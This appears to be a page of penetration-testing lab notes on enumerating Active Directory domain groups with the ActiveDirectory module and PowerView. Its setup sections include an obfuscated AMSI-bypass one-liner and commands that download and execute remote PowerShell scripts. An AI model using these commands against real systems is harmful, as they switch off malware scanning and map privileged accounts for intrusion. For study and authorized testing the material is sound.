---
title: "Domain Groups"
description: "Enumerating domain groups."
lead: "Enumerating information about domain groups using the ActiveDirectory PowerShell module and PowerView."
date: 2021-11-07T17:58:37+01:00
lastmod: 2021-11-07T17:58:37+01:00
draft: false
images: []
menu: 
  active_directory:
    parent: "domain_enumeration"
weight: 30
toc: true
---

## ActiveDirectory Module

### Setup

```powershell
# If computer has internet access
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory

# If computer has no internet access, download repository
Import-Module .\ADModule\Microsoft.ActiveDirectory.Management.dll -Verbose
Import-Module .\ADModule\ActiveDirectory\ActiveDirectory.psd1

# Check if module has been imported correctly
Get-Command -Module ActiveDirectory
```

### Commands

```powershell
# Get all groups in current domain
Get-ADGroup -Filter * | Select Name
Get-ADGroup -Filter * -Properties *

# Get all groups containing the word "admin" in group name
Get-ADGroup -Filter 'Name -Like "*admin*"' | Select Name

# Get all members of Domain Admins group
Get-ADGroupMember -Identity "Domain Admins" -Recursive

# Get group membership for a user
Get-ADPrincipalGroupMembership -Identity student1
```

## PowerView

### Setup

```powershell
# If it gets blocked by AMSI we can bypass it with
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

# Then load the module
Import-Module .\PowerView.ps1
. .\PowerView.ps1

# With internet access
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1')
```

### Commands

```powershell
# Get all groups in current domain
Get-NetGroup
Get-NetGroup -FullData

# Get information about groups in other domain
Get-NetGroup -Domain lab.local

# Get all groups containing the word "admin" in group name
Get-NetGroup "*admin*"

# Get information about specific group
Get-NetGroup -FullData "Domain Admins"

# Get all members of Domain Admins group
# If member is a group, get members of that group as well
Get-NetGroupMember -GroupName "Domain Admins" -Recurse

# Get list of Enterprise Admins, only available from forest root
Get-NetGroupMember -GroupName "Enterprise Admins" -Domain lab.local

# Get group membership for a user
Get-NetGroup -UserName "student1"

# List all local groups on a machine (needs administrator privileges on non-dc machines)
Get-NetLocalGroup -ComputerName dc.lab.local -ListGroups

# Get members of all local groups on a machine (needs administrator privileges on non-dc machines)
Get-NetLocalGroup -ComputerName dc.lab.local -Recurse

# Find linked DA accounts using name correlation
Get-DomainGroupMember 'Domain Admins' | %{Get-DomainUser $_.membername -LDAPFilter '(displayname=*)'} | %{$a=$_.displayname.split(' ')[0..1] -join ' '; Get-DomainUser -LDAPFilter "(displayname=*$a*)" -Properties displayname,samaccountname}

# Find any machine accounts in privileged groups
Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*$'}

# Enumerate all groups in a domain that don't have a global scope, returning just group names
Get-DomainGroup -GroupScope NotGlobal -Properties name
```
